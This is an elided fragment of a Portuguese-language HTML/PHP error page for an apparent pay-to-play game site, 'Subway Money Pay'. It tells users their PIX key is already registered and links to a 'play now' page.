...
<head>
    ...
    <meta charset="pt-br">
    <title>Erro - Subway Money Pay </title>
...
<?php
    ...
    background-color: #af0303 !important;
            ...
            <div class="minting-container w-container" style="margin-top: -20%">
                ...
                <a style="color: red;"><h2>ATENÇÃO!</a> <br>VOCÊ JÁ CADASTROU UMA CHAVE PIX EM NOSSO SISTEMA!</br> </h2>
                <p ><strong>Ops, parece que o <a style="color: red;"><b>você já tem uma Chave PIX cadastrada em nosso sistema.</b></a> Sua chave PIX já foi validada,<b></b> você já pode realizar seu 1º SAQUE assim que atingir o valor mínimo. Se precisar de ajuda, estamos à disposição para auxiliá-lo.
                    </strong>
                </p>
                <strong style="margin-top: 20px">👇 Clique no Botão Abaixo 👇️️️</strong>

                <a href="https://subwaymoneypay.com/presell/new-index.php" class="cadastro-btn">JOGAR AGORA</a>
